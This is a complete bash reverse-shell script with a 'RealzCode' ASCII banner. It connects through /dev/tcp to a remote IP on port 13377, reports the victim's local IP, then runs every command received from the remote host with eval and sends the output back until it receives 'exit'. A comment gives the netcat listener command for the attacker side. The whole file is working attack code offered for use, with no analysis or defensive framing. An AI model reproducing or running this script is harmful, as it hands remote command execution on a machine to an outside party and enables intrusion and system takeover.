#!/bin/bash

we=$(cat <<ASCII
  _____            _      _____          _      
 |  __ \          | |    / ____|        | |     
 | |__) |___  __ _| |___| |     ___   __| | ___ 
 |  _  // _ \/ _\` | |_  / |    / _ \ / _\` |/ _ \\
 | | \ \  __/ (_| | |/ /| |___| (_) | (_| |  __/
 |_|  \_\___|\__,_|_/___|\_____\___/ \__,_|\___|
ASCII
)

po=13377 # nc -l -p 13377

if [[ $# -eq 0 ]]; then
    echo "Please provide the IP address as a command-line argument."
    exit 1
fi

ip=$1
client_ip=$(hostname -I | awk '{print $1}')
we+="Client IP: $client_ip\n"

exec 3<> /dev/tcp/"$ip"/"$po"

if [[ $? -ne 0 ]]; then
    echo "Error: Connection failed"
    exit 1
fi

echo "$ip:$po"

echo -e "$we\n" >&3

while IFS= read -r -u 3 -p "$ "; do
    if [[ $REPLY == "exit" ]]; then
        break
    fi

    output=$(eval "$REPLY")
    echo "$output" >&3
done

exec 3>&-
